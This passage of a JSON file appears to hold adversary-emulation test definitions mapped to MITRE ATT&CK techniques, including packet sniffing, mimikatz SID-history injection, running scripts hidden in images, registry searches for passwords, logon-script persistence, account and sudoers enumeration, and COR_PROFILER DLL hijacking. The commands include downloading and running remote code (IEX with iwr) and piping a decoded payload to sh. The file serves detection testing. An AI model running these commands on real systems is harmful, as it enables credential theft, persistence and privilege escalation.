				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_freebsd_pcapdemo"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "exit 1\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -i #{ifname} -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Filtered Packet Capture FreeBSD using /dev/bpfN with sudo",
		"auto_generated_guid": "a3a0d4c9-c068-4563-a08d-583bd05b884c",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"ifname": {
				"description": "Specify interface to perform PCAP on.",
				"type": "string",
				"default": "em0"
			},
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/freebsd_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_freebsd_pcapdemo"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "exit 1\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -f -i #{ifname} -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo",
		"auto_generated_guid": "10c710c9-9104-4d5f-8829-5b65391e2a29",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_linux_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -a -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo",
		"auto_generated_guid": "7a0895f0-84c1-4adf-8491-a21510b1d4c1",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_linux_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -4 -p 6 -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo",
		"auto_generated_guid": "515575ab-d213-42b1-aa64-ef6a2dd4641b",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_linux_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -4 -P -p 17 -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo",
		"auto_generated_guid": "b1cbdf8b-6078-48f5-a890-11ea19d7f8e9",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"csource_path": {
				"description": "Path to C program source",
				"type": "string",
				"default": "PathToAtomicsFolder/T1040/src/linux_pcapdemo.c"
			},
			"program_path": {
				"description": "Path to compiled C program",
				"type": "string",
				"default": "/tmp/t1040_linux_pcapdemo"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "compile C program\n",
				"prereq_command": "if [ -f \"#{program_path}\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "cc #{csource_path} -o #{program_path}\n"
			}
		],
		"executor": {
			"command": "sudo #{program_path} -a -f -t 3\n",
			"cleanup_command": "rm -f #{program_path}\n",
			"name": "bash",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "PowerShell Network Sniffing",
		"auto_generated_guid": "9c15a7de-de14-46c3-bc2a-6d94130986ae",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007\n",
			"cleanup_command": "del $ENV:Temp\\sniff.etl",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1040",
		"phases": ["credential-access", "discovery"]
	},
	{
		"name": "Injection SID-History with mimikatz",
		"auto_generated_guid": "6bef32e5-9456-4072-8f14-35566fb85401",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"sid_to_inject": {
				"description": "SID to inject into sidhistory",
				"type": "string",
				"default": "S-1-5-21-1004336348-1177238915-682003330-1134"
			},
			"sam_account_name": {
				"description": "Target account to modify",
				"type": "string",
				"default": "$env:username"
			},
			"mimikatz_path": {
				"description": "Mimikatz windows executable",
				"type": "path",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
				"prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"name": "command_prompt",
			"elevation_required": true,
			"command": "#{mimikatz_path} \"privilege::debug\" \"sid::patch\" \"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\" \"exit\"\n",
			"cleanup_command": "#{mimikatz_path} \"sid::clear /sam:#{sam_account_name}\" \"exit\"\n"
		},
		"attack_technique": "T1134.005",
		"phases": ["defense-evasion", "privilege-escalation"]
	},
	{
		"name": "Steganographic Tarball Embedding",
		"auto_generated_guid": "c7921449-8b62-4c4d-8a83-d9281ac0190b",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"image_file": {
				"description": "Image file which will be downloaded to be used to hide data",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg"
			},
			"tar_file": {
				"description": "Tarz file containing random passwords",
				"type": "path",
				"default": "$env:PUBLIC\\Downloads\\T1001.002.tarz"
			},
			"new_image_file": {
				"description": "new image file ready for extraction",
				"type": "path",
				"default": "$env:PUBLIC\\Downloads\\T1001.002New.jpg"
			},
			"passwords_file": {
				"description": "Text file containing random passwords",
				"type": "path",
				"default": "$env:TEMP\\random_passwords.txt"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Image file must exist\n",
				"prereq_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile \"#{image_file}\"\n"
			},
			{
				"description": "File to hide within tarz file must exist\n",
				"prereq_command": "if (!(Test-Path \"#{passwords_file}\")) {exit 1} else {\n{exit 0}\n}\n",
				"get_prereq_command": "Write-Output \"Generating random passwords and saving to file...\"\n$passwords = 1..10 | ForEach-Object { Get-Random -InputObject ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?') -Count 12 }\n$passwords | Out-File -FilePath \"#{passwords_file}\"    \n"
			},
			{
				"description": "Tarz file to embed in image must exist \n",
				"prereq_command": "if (!(Test-Path \"#{tar_file}\")) {exit 1} else {\n{exit 0}\n}\n",
				"get_prereq_command": "Write-Output \"Generating tarz file...\"\ntar -cvf \"#{tar_file}\" \"#{passwords_file}\"\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "Get-Content \"#{image_file}\", \"#{tar_file}\" -Encoding byte -ReadCount 0 | Set-Content \"#{new_image_file}\" -Encoding byte\n",
			"cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"#{new_image_file}\" -Force -ErrorAction Ignore\n"
		},
		"attack_technique": "T1001.002",
		"phases": ["command-and-control"]
	},
	{
		"name": "Embedded Script in Image Execution via Extract-Invoke-PSImage",
		"auto_generated_guid": "04bb8e3d-1670-46ab-a3f1-5cee64da29b6",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"image_file": {
				"description": "Malicious Image file which will be downloaded",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg"
			},
			"psimage_script": {
				"description": "Extract-Invoke-PSImage Script downloaded",
				"type": "path",
				"default": "PathToAtomicsFolder\\ExternalPayloads\\Extract-Invoke-PSImage.ps1"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Image file must exist\n",
				"prereq_command": "if (!(Test-Path \"#{image_file}\")) {exit 1} else {\n{exit 0}\n}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{image_file}\") -ErrorAction Ignore | Out-Null\nWrite-Output \"Downloading image file...\"\n$imageUrl = \"https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg\"\nInvoke-WebRequest -Uri $imageUrl -OutFile #{image_file}\n"
			},
			{
				"description": "Extract-Invoke-PSImage must exist\n",
				"prereq_command": "if (!(Test-Path \"#{psimage_script}\")) {exit 1} else {\n{exit 0}\n}\n",
				"get_prereq_command": "New-Item -Path \"PathToAtomicsFolder\\ExternalPayloads\\\" -ItemType Directory -Force | Out-Null\nWrite-Output \"Downloading Extract-Invoke-PSImage.ps1 script...\"\n$scriptUrl = \"https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1\"\nInvoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script}\n"
			}
		],
		"executor": {
			"name": "powershell",
			"elevation_required": true,
			"command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"#{image_file}\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n",
			"cleanup_command": "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore        \n"
		},
		"attack_technique": "T1001.002",
		"phases": ["command-and-control"]
	},
	{
		"name": "Execute Embedded Script in Image via Steganography",
		"auto_generated_guid": "4ff61684-ad91-405c-9fbc-048354ff1d07",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"script": {
				"description": "Shell Script file to be embedded and executed",
				"type": "String",
				"default": "PathToAtomicsFolder/script.sh"
			},
			"evil_image": {
				"description": "The modified image with embedded script",
				"type": "String",
				"default": "PathToAtomicsFolder/evil_image.jpg"
			},
			"image": {
				"description": "Image file to be embedded",
				"type": "String",
				"default": "PathToAtomicsFolder/image.jpg"
			}
		},
		"executor": {
			"command": "cat \"#{script}\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"#{image}\" - > \"#{evil_image}\"; strings \"#{evil_image}\" | tail -n 1 | base64 -d | sh",
			"cleanup_command": "rm \"#{evil_image}\"",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1001.002",
		"phases": ["command-and-control"]
	},
	{
		"name": "Enumeration for Credentials in Registry",
		"auto_generated_guid": "b6ec082c-7384-46b3-a111-9a9b8b14e5e7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1552.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Enumeration for PuTTY Credentials in Registry",
		"auto_generated_guid": "af197fd7-e868-448e-9bd5-05d1bcd9d9e5",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1552.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Logon Scripts",
		"auto_generated_guid": "d6042746-07d4-4c92-9ad8-e644c114a231",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"script_path": {
				"description": "Path to .bat file",
				"type": "string",
				"default": "%temp%\\art.bat"
			},
			"script_command": {
				"description": "Command To Execute",
				"type": "string",
				"default": "echo Art \"Logon Script\" atomic test was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt"
			}
		},
		"executor": {
			"command": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n",
			"cleanup_command": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1\ndel #{script_path} >nul 2>&1\ndel \"%USERPROFILE%\\desktop\\T1037.001-log.txt\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1037.001",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Enumerate all accounts (Local)",
		"auto_generated_guid": "f8aab3dd-5990-4bf8-b8ab-2226c951696f",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1087.001.txt"
			}
		},
		"executor": {
			"command": "cat /etc/passwd > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "View sudoers access",
		"auto_generated_guid": "fed9be70-0186-4bde-9f8a-20945f9370c2",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1087.001.txt"
			}
		},
		"executor": {
			"command": "if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;\nif [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "View accounts with UID 0",
		"auto_generated_guid": "c955a599-3653-4fe5-b631-f11c00eb0397",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1087.001.txt"
			}
		},
		"executor": {
			"command": "grep 'x:0:' /etc/passwd > #{output_file}\ngrep '*:0:' /etc/passwd >> #{output_file}\ncat #{output_file} 2>/dev/null\n",
			"cleanup_command": "rm -f #{output_file} 2>/dev/null\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "List opened files by user",
		"auto_generated_guid": "7e46c7a5-0142-45be-a858-1a3ecb4fd3cb",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "username=$(id -u -n) && lsof -u $username\n",
			"name": "sh",
			"elevation_required": false
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "check if lsof exists\n",
				"prereq_command": "which lsof\n",
				"get_prereq_command": "(which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)\n"
			}
		],
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Show if a user account has ever logged in remotely",
		"auto_generated_guid": "0f0b6a29-08c3-44ad-a30b-47fd996b2110",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"output_file": {
				"description": "Path where captured results will be placed",
				"type": "path",
				"default": "/tmp/T1087.001.txt"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if lastlog command exists on the machine\n",
				"prereq_command": "if [ -x \"$(command -v lastlog)\" ]; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "sudo apt-get install login; exit 1;\n"
			}
		],
		"executor": {
			"command": "[ \"$(uname)\" = 'FreeBSD' ] && cmd=\"lastlogin\" || cmd=\"lastlog\" \n$cmd > #{output_file}\ncat #{output_file}\n",
			"cleanup_command": "rm -f #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate users and groups",
		"auto_generated_guid": "e6f36545-dc1e-47f0-9f48-7f730f54a02e",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "groups\nid\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate users and groups",
		"auto_generated_guid": "319e9f6c-7a9e-432e-8c62-9385c803b6f2",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate all accounts on Windows (Local)",
		"auto_generated_guid": "80887bec-5a9b-4efc-a81d-f83eb2eb32ab",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net user\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate all accounts via PowerShell (Local)",
		"auto_generated_guid": "ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "net user\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-localgroup\nnet localgroup\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "Enumerate logged on users via CMD (Local)",
		"auto_generated_guid": "a138085e-bfe5-46ba-a242-74a6fb884af3",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "query user\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1087.001",
		"phases": ["discovery"]
	},
	{
		"name": "User scope COR_PROFILER",
		"auto_generated_guid": "9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "unmanaged profiler DLL",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
			},
			"clsid_guid": {
				"description": "custom clsid guid",
				"type": "string",
				"default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "\"#{file_name}\" must be present\n",
				"prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
			}
		],
		"executor": {
			"command": "Write-Host \"Creating registry keys in HKCU:Software\\Classes\\CLSID\\#{clsid_guid}\" -ForegroundColor Cyan\nNew-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\\InprocServer32\" -Value \"#{file_name}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\nWrite-Host \"executing eventvwr.msc\" -ForegroundColor Cyan\nSTART MMC.EXE EVENTVWR.MSC\n",
			"cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\#{clsid_guid}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1574.012",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "System Scope COR_PROFILER",
		"auto_generated_guid": "f373b482-48c8-4ce4-85ed-d40c8b3f7310",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "unmanaged profiler DLL",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
			},
			"clsid_guid": {
				"description": "custom clsid guid",
				"type": "string",
				"default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "\"#{file_name}\" must be present\n",
				"prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
			}
		],
		"executor": {
			"command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"#{clsid_guid}\" -Force | Out-Null\nNew-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value \"#{file_name}\" -Force | Out-Null\n",
			"cleanup_command": "Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1574.012",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Registry-free process scope COR_PROFILER",
		"auto_generated_guid": "79d57242-bbef-41db-b301-9d01d9f6e817",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_name": {
				"description": "unamanged profiler DLL",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
			},
			"clsid_guid": {
				"description": "custom clsid guid",
				"type": "string",
				"default": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "\"#{file_name}\" must be present\n",
				"prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n"
			}
		],
		"executor": {
			"command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n",
			"cleanup_command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1574.012",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	}
]
